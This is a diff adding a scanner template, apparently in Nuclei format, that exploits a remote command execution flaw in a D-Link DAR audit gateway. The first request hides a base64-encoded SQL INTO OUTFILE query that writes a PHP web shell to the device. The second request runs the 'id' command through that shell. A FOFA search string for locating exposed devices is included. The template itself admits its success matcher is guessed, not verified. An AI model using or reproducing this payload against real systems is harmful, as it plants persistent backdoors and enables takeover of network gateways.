@@ -1,0 +1,63 @@
+id: poc-369c64632e43ca9ca339
+info:
+  name: D-LinkDAR上网行为审计网关importhtml远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/369c64632e43ca9ca339b9d557a31ff1
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 369c64632e43ca9ca339b9d557a31ff1
+    fofa: + fofa`"mask.style.visibility" && title="D-Link"`
+http:
+- raw:
+  - 'GET /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvaGVsbG9kbGluay5waHAn HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: PHPSESSID=8d3887c7a401d2f1bc1a58631fcfa6e7
+
+    Accept: text/html, application/xhtml+xml, image/jxr, */*
+
+    Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /app/hellodlink.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: PHPSESSID=8d3887c7a401d2f1bc1a58631fcfa6e7
+
+    Accept: text/html, application/xhtml+xml, image/jxr, */*
+
+    Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 6
+
+
+    cmd=id'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
